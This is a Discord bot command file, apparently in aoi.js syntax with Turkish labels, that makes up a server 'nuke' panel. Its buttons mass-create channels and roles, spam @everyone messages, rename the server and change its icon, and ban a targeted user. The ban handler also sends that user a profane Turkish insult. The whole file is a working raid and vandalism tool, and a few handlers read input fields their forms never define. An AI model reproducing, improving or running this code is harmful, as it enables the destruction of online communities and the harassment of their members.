module.exports = [{
          code: `
          $title[Sunucu]
          $addButton[1;Herkesi Banla!;danger;button5;false;<:Ban_Icon_just1n0057:1214605193271058484>]
          $addButton[1;Rol Spamla;success;button4;false;<:redcikis_just1n0057:1216601725423845498>]
          $addButton[1;Kanal Spamla;primary;button1;false;<:mavi_yazikanali_just1n0057:1216046025362505883>]
          $addButton[1;Mesaj Spamla;primary;button2;false;<:redcikis_just1n0057:1216601725423845498>]
          $addButton[1;Sunucu İsim/Avatar;primary;button3;false;<a:gulmek_just1n0057:1214601561351651409>]
          $color[#ffe46c]
          $onlyForIDs[;]
          `
      }, {
          code: `
          $interactionModal[Sunucu İD'si Girin;kanalxd;
          {actionRow:
              {textInput:Sunucu İDsi:1:kanalInput:true:Sunucu İD:2}
          }]
          `
      }, {
          code: `
          $interactionReply[$textInputValue[idInput] ID'li Sunucuda Kanal Sp.mlandı!;everyone;true;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
          $createChannel[$textInputValue[kanalInput];;Voice;false]
          $createChannel[$textInputValue[kanalInput];;Text;false]
            
          `
      }, {
          code: `
          $interactionModal[Spam İçin Kanal İD!;spamxd;
          {actionRow:
              {textInput:Spam İçin Kanal İD:1:idInput:true:Kanal İD:2:100}
          }]
          `
      }, {
          code: `
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
          `
      }, {
          code: `
          $interactionModal[Sunucu/Avatar Değişim!;sunucuxd;
          {actionRow:
              {textInput:sunucu id girin:1:idInput:true:sunucu id:2:200}
          }
          {actionRow:
              {textInput:Yeni Sunucu İsim:1:isimInput:true:yeni Sunucu ismi girin!:2:200}
          }
          {actionRow:
              {textInput:Avatar URL:1:avatarInput:true:Profil Link!:2:200}
          }]
          `
      }, {
          code: `
          $interactionReply[$textInputValue[idInput] ID'li Sunucunun Profil & Avatarı Değiştirildi!;everyone;true;false]
          $setGuildName[$textInputValue[isimInput];$textInputValue[idInput]]
          $setGuildIcon[$textInputValue[avatarInput];$textInputValue[idInput]]
          `
      }, {
          code: `
          $interactionModal[Sunucu İDsi Girin!;rolexd;
          {actionRow:
              {textInput:Rol Oluşturulacak Sunucu İD:1:roleInput:true:Sunucu İD:2:200}
          }]
          `
      }, {
          code: `
          $interactionReply[$textInputValue[idInput] ID'li Sunucuda Rol Sp.mlandı;everyone;true;false]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
          `
      }, {
          code: `
          $interactionModal[Lütfen Aşağıdaki Bilgileri Doldurun!;banlaxd;
          {actionRow:
              {textInput:Sunucu İD:1:swidInput:true:Sunucu İD!:2:200}
          }
          {actionRow:
              {textInput:Kullanıcı İD:1:userInput:true:Kullanıcı İD!:2:200}
          }
          ]`
      }, {
          code: `

          $dm[$textInputValue[userInput]]
          <@$textInputValue[userInput]> BANLANDIN OROSPU ÇOCUĞU XDDDDDD
          $ban[$textInputValue[swidInput];$textInputValue[userInput];7;BANLANDIN OROSPU ÇOCUĞU XDD]
          `
      }];
      
